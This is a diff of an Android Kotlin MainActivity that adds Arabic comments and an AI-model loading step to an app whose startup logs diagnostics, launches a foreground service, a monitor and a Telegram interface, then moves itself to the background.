@@ -19,11 +19,28 @@ import kotlinx.coroutines.withContext
 import java.text.SimpleDateFormat
 import java.util.*
 
+/**
+ * النشاط الرئيسي للتطبيق – يعمل كواجهة سجل تشخيصي (Diagnostic Console)
+ * لإظهار جميع عمليات التهيئة والنجاحات والفشل بدقة، مع إمكانية تسجيل الأخطاء
+ * من الفئات الأخرى عبر الدالة الثابتة appendLogStatic.
+ *
+ * ✅ التعديلات الجديدة:
+ * - إضافة معالج استثناءات عام (UncaughtExceptionHandler) لمنع الإغلاق الصامت.
+ * - إضافة زر لنسخ السجل التشخيصي بالكامل (btnCopyLog).
+ * - إضافة تسجيل تشخيصي لجميع مراحل التهيئة.
+ * - ✅ استدعاء ConfigLoader.ensureModelLoaded() لتحميل نموذج AI تلقائياً.
+ * - إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الخلفي.
+ */
 class MainActivity : AppCompatActivity() {
     companion object {
         @Volatile
         private var instance: MainActivity? = null
 
+        /**
+         * دالة ثابتة لتسجيل رسائل السجل من أي مكان في التطبيق.
+         * يتم استدعاؤها من ConfigLoader و TelegramUi و ForegroundService وغيرها.
+         * @param msg الرسالة المراد تسجيلها
+         */
         fun appendLogStatic(msg: String) {
             instance?.appendLog(msg) ?: android.util.Log.i("DIAGNOSTIC", msg)
         }
@@ -34,7 +51,7 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // ✅ معالج الاستثناءات العام
+        // ✅ معالج الاستثناءات العام لمنع الإغلاق الصامت
         Thread.setDefaultUncaughtExceptionHandler { _, throwable ->
             val errorMsg = "❌ CRITICAL CRASH: ${throwable.localizedMessage}\n${throwable.stackTraceToString()}"
             appendLog(errorMsg)
@@ -51,6 +68,7 @@ class MainActivity : AppCompatActivity() {
             appendLog("📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}")
             appendLog("📊 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
 
+            // ✅ زر نسخ السجل التشخيصي بالكامل
             btnCopyLog.setOnClickListener {
                 val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                 val clip = ClipData.newPlainText("DiagnosticLogs", logTextView.text.toString())
@@ -68,7 +86,7 @@ class MainActivity : AppCompatActivity() {
             appendLog("✅ Foreground Service Dispatched Successfully")
 
             lifecycleScope.launch(Dispatchers.IO) {
-                delay(2000)
+                delay(2000) // تأخير بشري بسيط
                 initCoreAsync()
             }
 
@@ -78,6 +96,11 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    /**
+     * دالة مثيل (Instance) لتسجيل الرسائل في السجل التشخيصي.
+     * يتم استدعاؤها داخلياً ومن appendLogStatic.
+     * @param msg الرسالة المراد تسجيلها
+     */
     fun appendLog(msg: String) {
         val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
         val logEntry = "[$timestamp] $msg\n"
@@ -93,6 +116,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ============================================================
+    //  التهيئة الأساسية (Core Initialization)
+    // ============================================================
+
     private suspend fun initCoreAsync() {
         appendLog("🚀 Starting Core Initialization...")
         try {
@@ -105,6 +132,10 @@ class MainActivity : AppCompatActivity() {
             if (config.activeTokens.isEmpty()) {
                 appendLog("⚠️ WARNING: No active tokens! Telegram will NOT work.")
             }
+
+            // ✅ تحميل نموذج AI في الخلفية بعد تحميل الإعدادات
+            appendLog("📥 Checking for AI model...")
+            ConfigLoader.ensureModelLoaded(this@MainActivity)
 
             appendLog("🛰️ Initializing Monitor & Telegram UI...")
             val monitor = Monitor.getInstance(this@MainActivity)
@@ -120,7 +151,7 @@ class MainActivity : AppCompatActivity() {
             monitor.start()
             appendLog("✅ All Core Systems Operational.")
 
-            // ✅ إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص
+            // ✅ إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الآمن
             withContext(Dispatchers.Main) {
                 delay(10000)
                 moveTaskToBack(true)
@@ -131,6 +162,10 @@ class MainActivity : AppCompatActivity() {
             e.printStackTrace()
         }
     }
+
+    // ============================================================
+    //  إدارة دورة الحياة
+    // ============================================================
 
     override fun onDestroy() {
         super.onDestroy()
